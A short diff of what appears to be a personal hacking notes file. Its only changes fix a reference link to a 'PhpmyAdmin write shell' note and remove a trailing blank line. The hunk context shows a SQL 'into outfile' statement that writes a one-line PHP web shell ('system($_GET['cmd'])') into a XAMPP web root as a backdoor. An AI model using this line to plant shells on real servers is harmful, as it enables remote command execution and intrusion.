@@ -5,9 +5,8 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoo
 ```
 
 # References
-- [20221003150553](/zet/20221003150553/) PhpmyAdmin write shell
+- [20221003150553](/zet/20221003150553/README.md) PhpmyAdmin write shell
 - ~/kb/hacking/common-commands.md
 
 Tags:
     #assorted
-
